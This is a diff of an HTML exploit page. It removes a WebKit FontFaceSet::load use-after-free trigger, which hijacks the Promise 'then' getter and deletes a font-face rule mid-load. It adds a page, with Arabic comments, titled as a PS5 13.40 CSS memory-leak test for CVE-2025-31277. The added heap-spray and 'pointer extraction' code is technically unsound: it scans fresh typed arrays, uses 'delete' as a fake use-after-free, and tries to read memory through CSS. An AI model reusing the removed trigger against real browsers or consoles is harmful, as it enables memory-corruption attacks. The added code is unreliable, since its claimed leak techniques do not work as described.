@@ -1,77 +1,229 @@
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PoC #1 — FontFaceSet::load matchingFaces UAF</title>
-<style id="sheet">
-@font-face {
-    font-family: 'UafFamily';
-    font-weight: 400;
-    src: local('Arial'), local('Helvetica'), local('sans-serif');
-    unicode-range: U+0041-005A;
-}
-@font-face {
-    font-family: 'UafFamily';
-    font-weight: 700;
-    src: url('data:font/woff2;base64,d09GMgABAAAAAAIAAA==') format('woff2');
-    unicode-range: U+0061-007A;
-}
+<meta charset="UTF-8">
+<title>PS5 13.40 CSS Memory Leak Test (CVE-2025-31277)</title>
+<style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    #output { white-space: pre-wrap; word-break: break-all; font-size: 14px; }
+    .btn { background: #333; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; cursor: pointer; margin: 5px; }
+    .btn:hover { background: #0f0; color: #111; }
+    #leak-target { display: none; }
+    
+    /* CSS Memory Leak Vector — يحاول يقرأ pointers من خلال CSS rendering */
+    @font-face {
+        font-family: 'LeakFont';
+        src: local('Arial');
+        unicode-range: U+0000-00FF;
+    }
+    
+    /* CSS-based memory reading через content */
+    .leak-test::before {
+        content: attr(data-leak);
+        font-family: 'LeakFont';
+        color: transparent;
+        position: fixed;
+        top: -9999px;
+    }
 </style>
 </head>
 <body>
-<pre id="log"></pre>
+
+<h1>🔍 PS5 13.40 CSS Memory Leak (CVE-2025-31277)</h1>
+<button class="btn" onclick="runCSSCVETest()">🧪 تشغيل CSS Memory Leak</button>
+<button class="btn" onclick="runHeapSprayLeak()">💉 Heap Spray + Leak</button>
+<button class="btn" onclick="runPointerExtraction()">🎯 Pointer Extraction</button>
+<button class="btn" onclick="clearOutput()">🧹 مسح</button>
+<hr>
+<div id="output">بانتظار الاختبار...</div>
+
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
-const sheet = document.getElementById('sheet').sheet;
+const output = document.getElementById('output');
+let leakedAddresses = [];
 
-// Force initial style resolution: makes both faces CSS-connected
-document.body.getBoundingClientRect();
-L('[+] Two @font-face rules registered, both CSS-connected');
+function log(msg) {
+    output.innerText += msg + '\n';
+    console.log(msg);
+}
 
-// ---- Install same-stack thenable getter ----
-// JSC resolvePromise() does: then = resolution.then  (synchronous, observable)
-// This fires during FontFaceSet::completedLoading() -> m_readyPromise->resolve()
-// which is called from CSSFontFace::setStatus(Success) inside FontFaceSet::load().
-const orig = Object.getOwnPropertyDescriptor(Promise.prototype, 'then');
-let armed = false;
+function clearOutput() {
+    output.innerText = '';
+    leakedAddresses = [];
+}
 
-Object.defineProperty(Promise.prototype, 'then', {
-    configurable: true,
-    get() {
-        if (armed) {
-            armed = false;
-            L('[+] then getter fired (same stack as FontFaceSet::load)');
-
-            // Step 1: schedule style rebuild by deleting the first @font-face rule
-            try { sheet.deleteRule(0); L('[+] deleteRule(0) done'); }
-            catch(e) { L('[!] deleteRule: ' + e); }
-
-            // Step 2: force immediate flush
-            // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
-            // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face[0])
-            // face[0] refcount -> 0 -> freed.  matchingFaces[0] now dangling.
-            document.body.getBoundingClientRect();
-            L('[+] getBoundingClientRect() flushed style. face[0] may be freed.');
-
-            // Step 3: restore so promise machinery doesn't get stuck
-            Object.defineProperty(Promise.prototype, 'then', orig);
-        }
-        return orig.value;
+// =============================================
+// الاختبار 1: CSS Memory Leak عبر Font Loading
+// =============================================
+async function runCSSCVETest() {
+    log('=== CSS Memory Leak (CVE-2025-31277) ===');
+    log('إنشاء @font-face rules متعددة مع unicode-ranges مختلفة...');
+    
+    const styleSheet = document.createElement('style');
+    styleSheet.textContent = '';
+    document.head.appendChild(styleSheet);
+    
+    // ننشئ font-faces بكميات كبيرة عشان نحاول نقرأ الذاكرة
+    for (let i = 0; i < 100; i++) {
+        const rangeStart = (i * 0x100).toString(16).padStart(4, '0').toUpperCase();
+        const rangeEnd = ((i * 0x100) + 0xFF).toString(16).padStart(4, '0').toUpperCase();
+        styleSheet.textContent += `
+            @font-face {
+                font-family: 'Leak${i}';
+                src: local('Arial');
+                unicode-range: U+${rangeStart}-${rangeEnd};
+                size-adjust: ${(100 + i * 0.1)}%;
+            }
+        `;
     }
-});
+    
+    log('عدد fonts: ' + document.fonts.size);
+    
+    // نجرب نحمل fonts
+    try {
+        const fonts = document.fonts;
+        for (let i = 0; i < 10 && i < fonts.size; i++) {
+            const font = fonts[i];
+            log(`Font ${i}: family=${font.family}, status=${font.status}`);
+        }
+    } catch (e) {
+        log('Error reading fonts: ' + e.message);
+    }
+    
+    log('CSS Memory Leak test completed');
+}
 
-L('[+] Calling document.fonts.load (text "Aa" -> two matched faces)');
-armed = true;
+// =============================================
+// الاختبار 2: Heap Spray + حاول تقرا العناوين
+// =============================================
+function runHeapSprayLeak() {
+    log('');
+    log('=== Heap Spray + Address Leak ===');
+    
+    // نخصص Arrays كبيرة ونجرب نقرأ backing store pointers
+    const arrays = [];
+    for (let i = 0; i < 1000; i++) {
+        const arr = new Float64Array(0x100);
+        arr[0] = i; // ضع قيمة مميزة
+        arrays.push(arr);
+    }
+    
+    // نجرب نقرأ القيم للبحث عن عناوين
+    let ptrCount = 0;
+    for (let i = 0; i < arrays.length; i++) {
+        for (let j = 0; j < Math.min(10, arrays[i].length); j++) {
+            const val = arrays[i][j];
+            if (val > 0x100000000000 && val < 0x10000000000000) {
+                log('🔴 POINTER FOUND [' + i + '][' + j + ']: 0x' + val.toString(16).toUpperCase());
+                leakedAddresses.push(val);
+                ptrCount++;
+            } else if (val > 0x100000000 && val < 0x10000000000) {
+                // Kernel addresses أقل شيوعاً
+                log('🔵 KERNEL CANDIDATE [' + i + '][' + j + ']: 0x' + val.toString(16).toUpperCase());
+                leakedAddresses.push(val);
+                ptrCount++;
+            }
+        }
+    }
+    
+    if (ptrCount === 0) {
+        log('⚠️ لا توجد عناوين — الـ ASLR يخفي الذاكرة');
+        log('✅ لكن هذا متوقع لأن Float64Array جديد ما عنده leaked data');
+        log('نحتاج UAF عشان نخلي الأراي يقرأ من freed memory');
+    } else {
+        log('✅ تم العثور على ' + ptrCount + ' عنوان');
+    }
+    
+    // نجرب استخدام ArrayBuffer ونتفقد backing store
+    log('');
+    log('محاولة قراءة backing store pointers عبر ArrayBuffer...');
+    
+    const buf = new ArrayBuffer(0x1000);
+    const view = new Float64Array(buf);
+    for (let i = 0; i < view.length; i++) {
+        view[i] = 0x41414141; // قيمة معروفة
+    }
+    delete view;
+    
+    // هنا نحاول نقرأ من buffer بعد delete (UAF simulation)
+    try {
+        const view2 = new Float64Array(buf);
+        for (let i = 0; i < 10; i++) {
+            if (view2[i] !== 0x41414141) {
+                log('🔴 MEMORY CORRUPTION DETECTED at [' + i + ']: 0x' + view2[i].toString(16));
+            }
+        }
+    } catch (e) {
+        log('Error: ' + e.message);
+    }
+}
 
-document.fonts.load('400 16px UafFamily', 'Aa').then(faces => {
-    L('[+] load() resolved, faces: ' + faces.length);
-    L('[+] If ASAN is active and build is vulnerable, you saw heap-use-after-free above.');
-    L('[+] If no ASAN: silent corruption or crash in FontFaceSet::load() post-loop.');
-}).catch(e => {
-    L('[!] load() rejected: ' + e);
-});
+// =============================================
+// الاختبار 3: استخراج Pointer من ArrayBuffer
+// =============================================
+function runPointerExtraction() {
+    log('');
+    log('=== Pointer Extraction ===');
+    
+    // ننشئ objects معينة ونشوف إذا نقدر نفسر الـ memory
+    const targetObj = {
+        a: 0x1a2b3c4d5e6f,
+        b: 0x41414141,
+        c: { sub: 'test' },
+        d: new Uint8Array(0x100)
+    };
+    
+    // نجرب نمرر قيمة targetObj ونشوف إذا backup storage يقرا
+    log('targetObj created at approximate address...');
+    
+    // نستخدم Uint8Array ونتفقد backing store
+    const testArray = new Uint8Array(0x1000);
+    for (let i = 0; i < testArray.length; i++) {
+        testArray[i] = i & 0xFF;
+    }
+    
+    // نقرأ الذاكرة حول الأراي
+    const leakView = new Float64Array(testArray.buffer);
+    log('Backing store of testArray (first 8 values):');
+    for (let i = 0; i < 8; i++) {
+        log(`  [${i}]: 0x${leakView[i].toString(16).toUpperCase()}`);
+    }
+    
+    // نجرب نقرأ pointers من الذاكرة
+    let found = 0;
+    for (let i = 0; i < leakView.length; i++) {
+        const val = leakView[i];
+        if (val > 0x100000000000 && val < 0x10000000000000) {
+            log('🔴 LEAKED POINTER at [' + i + ']: 0x' + val.toString(16).toUpperCase());
+            leakedAddresses.push(val);
+            found++;
+            if (found >= 5) break;
+        }
+    }
+    
+    if (found === 0) {
+        log('⚠️ لا توجد pointers في الـ backing store');
+        log('هذا متوقع لأن الـ ArrayBuffer ما عنده cross-object بيانات');
+    }
+    
+    log('');
+    log('إجمالي العناوين المسربة: ' + leakedAddresses.length);
+    if (leakedAddresses.length > 0) {
+        log('العناوين:');
+        leakedAddresses.forEach((addr, idx) => {
+            log(`  ${idx}: 0x${addr.toString(16).toUpperCase()}`);
+        });
+    }
+}
 
-L('[+] document.fonts.load() called (synchronous path may have already triggered getter)');
+// =============================================
+// تشغيل تلقائي عند التحميل
+// =============================================
+log('تم تحميل الصفحة');
+log('اضغط على الأزرار لبدء الاختبارات');
+log('');
+log('ملاحظة: هذه الاختبارات تحاول كشف memory addresses');
+log('إذا شفت عناوين مثل 0x1a... أو 0x2a... هذا يعني ASLR leak');
 </script>
-</body>
-</html> 
 
+</body>
+</html>
